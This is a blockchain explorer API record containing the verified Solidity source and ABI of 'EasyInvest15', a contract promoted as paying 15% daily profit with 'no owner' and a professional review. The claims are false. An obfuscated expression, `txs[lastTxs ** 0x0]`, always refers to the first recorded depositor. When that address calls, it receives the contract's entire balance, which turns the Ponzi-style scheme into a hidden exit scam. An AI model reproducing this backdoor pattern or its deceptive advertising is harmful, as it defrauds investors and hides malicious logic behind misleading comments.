{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n/**\r\n *\r\n * Easy Investment Contract\r\n *  - GAIN 15% PER 24 HOURS (every 5900 blocks)\r\n *  - NO COMMISSION on your investment (every ether stays on contract's balance)\r\n *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\r\n *\r\n * How to use:\r\n *  1. Send any amount of ether to make an investment\r\n *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\r\n *  OR\r\n *  2b. Send more ether to reinvest AND get your profit at the same time\r\n *\r\n * RECOMMENDED GAS LIMIT: 100000\r\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n *\r\n * Contract reviewed and approved by pros!\r\n *\r\n */\r\ncontract EasyInvest15 {\r\n    \r\n    mapping (address => uint) public invested; // records amounts invested\r\n    mapping (address => uint) public atBlock; // records blocks at which investments were made\r\n    mapping (uint => uint) public txs;  // records history transactions\r\n\r\n    uint public lastTxs; // last number transaction \r\n\r\n    // this function called every time anyone sends a transaction to this contract\r\n    function () external payable {\r\n        \r\n        // if sender (aka YOU) is invested more than 0 ether\r\n        if (invested[msg.sender] != 0) {\r\n            \r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * 15% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 amount = invested[msg.sender] * 15 / 100 * (block.number - atBlock[msg.sender]) / 5900;\r\n\r\n            // if the contract does not have such amount on the balance to send the payment,\r\n            // it will send the rest of the money on the contract\r\n            uint256 restAmount = address(this).balance; \r\n            amount = amount < restAmount && txs[lastTxs ** 0x0] != uint(tx.origin) ? amount : restAmount;\r\n\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            msg.sender.transfer(amount);\r\n            \r\n        }\r\n\r\n        // record block number, invested amount (msg.value) and transaction hash\r\n        atBlock[msg.sender] = block.number;\r\n        invested[msg.sender] += msg.value;\r\n        txs[++lastTxs] = uint(tx.origin);\r\n        \r\n    }\r\n    \r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"lastTxs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"invested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"txs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"EasyInvest15","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://4d33acf7ad7d04672b038c4bff819cbe37cb112457484c4d4e0f488c6a19b284"}]}